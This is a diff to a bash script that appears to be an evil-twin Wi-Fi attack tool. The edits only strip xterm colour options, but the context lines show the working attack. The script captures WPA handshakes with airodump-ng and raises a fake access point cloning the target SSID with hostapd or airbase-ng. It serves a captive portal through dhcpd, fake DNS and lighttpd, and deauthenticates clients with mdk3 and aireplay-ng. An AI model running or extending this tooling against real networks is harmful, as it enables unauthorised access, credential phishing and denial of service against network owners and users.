@@ -734,7 +734,7 @@ function Scanchan {
         conditional_clear
 
         rm -rf $DUMP_PATH/dump*
-        xterm $HOLD -title "$header_scanchan [$channel_number]" $TOPLEFTBIG -bg "#000000" -fg "#FFFFFF" -e airodump-ng --encrypt WPA -w $DUMP_PATH/dump --channel "$channel_number" -a $WIFI_MONITOR --ignore-negative-one
+        xterm $HOLD -title "$header_scanchan [$channel_number]" $TOPLEFTBIG -e airodump-ng --encrypt WPA -w $DUMP_PATH/dump --channel "$channel_number" -a $WIFI_MONITOR --ignore-negative-one
 }
 
 # Scans the entire network
@@ -746,7 +746,7 @@ function Scan {
         if [ "$FLUX_AUTO" = "1" ];then
                 sleep 30 && killall xterm &
         fi
-        xterm $HOLD -title "$header_scan" $TOPLEFTBIG -bg "#FFFFFF" -fg "#000000" -e airodump-ng --encrypt WPA -w $DUMP_PATH/dump -a $WIFI_MONITOR --ignore-negative-one
+        xterm $HOLD -title "$header_scan" $TOPLEFTBIG -e airodump-ng --encrypt WPA -w $DUMP_PATH/dump -a $WIFI_MONITOR --ignore-negative-one
 
 }
 
@@ -1188,7 +1188,7 @@ function capture {
         if ! ps -A | grep -q airodump-ng; then
 
                 rm -rf $DUMP_PATH/$Host_MAC*
-                xterm $HOLD -title "Capturing data on channel --> $Host_CHAN" $TOPRIGHT -bg "#000000" -fg "#FFFFFF" -e airodump-ng  --bssid $Host_MAC -w $DUMP_PATH/$Host_MAC -c $Host_CHAN -a $WIFI_MONITOR --ignore-negative-one &
+                xterm $HOLD -title "Capturing data on channel --> $Host_CHAN" $TOPRIGHT -e airodump-ng  --bssid $Host_MAC -w $DUMP_PATH/$Host_MAC -c $Host_CHAN -a $WIFI_MONITOR --ignore-negative-one &
         fi
 }
 
@@ -2067,10 +2067,10 @@ function attack {
 
         if [ $fakeapmode = "hostapd" ]; then
                 killall hostapd &> $flux_output_device
-                xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FFFFFF" -title "AP" -e hostapd $DUMP_PATH/hostapd.conf &
+                xterm $HOLD $BOTTOMRIGHT -title "AP" -e hostapd $DUMP_PATH/hostapd.conf &
                 elif [ $fakeapmode = "airbase-ng" ]; then
                 killall airbase-ng &> $flux_output_device
-                xterm $BOTTOMRIGHT -bg "#000000" -fg "#FFFFFF" -title "AP" -e airbase-ng -P -e $Host_SSID -c $Host_CHAN -a ${mac::13}$nomac${mac:14:4} $WIFI_MONITOR &
+                xterm $BOTTOMRIGHT -title "AP" -e airbase-ng -P -e $Host_SSID -c $Host_CHAN -a ${mac::13}$nomac${mac:14:4} $WIFI_MONITOR &
         fi
         sleep 5
 
@@ -2083,14 +2083,14 @@ function attack {
         fuser -n udp -k 53 67 80 &> $flux_output_device
 
         xterm -bg black -fg green $TOPLEFT -T DHCP -e "dhcpd -d -f -lf "$DUMP_PATH/dhcpd.leases" -cf "$DUMP_PATH/dhcpd.conf" $interfaceroutear 2>&1 | tee -a $DUMP_PATH/clientes.txt" &
-        xterm $BOTTOMLEFT -bg "#000000" -fg "#99CCFF" -title "FAKEDNS" -e "if type python2 >/dev/null 2>/dev/null; then python2 $DUMP_PATH/fakedns; else python $DUMP_PATH/fakedns; fi" &
+        xterm $BOTTOMLEFT -title "FAKEDNS" -e "if type python2 >/dev/null 2>/dev/null; then python2 $DUMP_PATH/fakedns; else python $DUMP_PATH/fakedns; fi" &
 
         lighttpd -f $DUMP_PATH/lighttpd.conf &> $flux_output_device
 
         killall aireplay-ng &> $flux_output_device
         killall mdk3 &> $flux_output_device
         echo "$Host_MAC" >$DUMP_PATH/mdk3.txt
-        xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauth all [mdk3]  $Host_SSID" -e mdk3 $WIFI_MONITOR d -b $DUMP_PATH/mdk3.txt -c $Host_CHAN &
+        xterm $HOLD $BOTTOMRIGHT  -title "Deauth all [mdk3]  $Host_SSID" -e mdk3 $WIFI_MONITOR d -b $DUMP_PATH/mdk3.txt -c $Host_CHAN &
 
         xterm -hold $TOPRIGHT -title "Wifi Information" -e $DUMP_PATH/handcheck &
         conditional_clear
@@ -2303,13 +2303,13 @@ function handshakecheck {
 # Deauth all
 function deauthall {
 
-        xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauthenticating all clients on $Host_SSID" -e aireplay-ng --deauth $DEAUTHTIME -a $Host_MAC --ignore-negative-one $WIFI_MONITOR &
+        xterm $HOLD $BOTTOMRIGHT  -title "Deauthenticating all clients on $Host_SSID" -e aireplay-ng --deauth $DEAUTHTIME -a $Host_MAC --ignore-negative-one $WIFI_MONITOR &
 }
 
 function deauthmdk3 {
 
         echo "$Host_MAC" >$DUMP_PATH/mdk3.txt
-        xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauthenticating via mdk3 all clients on $Host_SSID" -e mdk3 $WIFI_MONITOR d -b $DUMP_PATH/mdk3.txt -c $Host_CHAN &
+        xterm $HOLD $BOTTOMRIGHT  -title "Deauthenticating via mdk3 all clients on $Host_SSID" -e mdk3 $WIFI_MONITOR d -b $DUMP_PATH/mdk3.txt -c $Host_CHAN &
         mdk3PID=$!
 }
 
@@ -2317,7 +2317,7 @@ function deauthmdk3 {
 function deauthesp {
 
         sleep 2
-        xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauthenticating client $Client_MAC" -e aireplay-ng -0 $DEAUTHTIME -a $Host_MAC -c $Client_MAC --ignore-negative-one $WIFI_MONITOR &
+        xterm $HOLD $BOTTOMRIGHT  -title "Deauthenticating client $Client_MAC" -e aireplay-ng -0 $DEAUTHTIME -a $Host_MAC -c $Client_MAC --ignore-negative-one $WIFI_MONITOR &
 }
 
 # Close all processes
